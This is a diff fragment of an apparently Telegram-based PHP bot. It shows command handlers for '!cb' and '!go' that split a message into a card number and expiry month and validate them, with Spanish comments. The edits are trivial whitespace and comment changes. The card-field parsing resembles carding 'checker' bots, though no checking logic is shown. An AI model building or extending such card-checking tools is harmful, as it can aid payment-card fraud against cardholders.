@@ -1571,6 +1571,9 @@ ob_flush();
 //if (preg_match('/^(!|\/|\.)cb/', $message)) {
 
 elseif((strpos($message, "!cb") === 0)||(strpos($message, "/cb") === 0)||(strpos($message, ".cb") === 0)){
+
+	
+//if (preg_match('/^(!|\/|\.)cb/', $message)) {//
 	
 $lista = substr($message, 4);
 $i = preg_split('/[|:| ]/', $lista);
@@ -1604,7 +1607,7 @@ if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_
 
 //----------------MENSAGE DE ESPERA-------------------//
 $respuesta = "<b>🕒 Wait for Result...</b>";
-sendMessage($chat_id, $respuesta, $message_id);
+sendMessage($chat_id,$respuesta, $message_id);
 //-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
 $id_text = file_get_contents("ID");
 //----------------------------------------------------//
@@ -1881,8 +1884,11 @@ ob_flush();
 
 
 	
-
 	
+	
+	
+	
+
 
 
 elseif((strpos($message, "!go") === 0)||(strpos($message, "/go") === 0)||(strpos($message, ".go") === 0)){
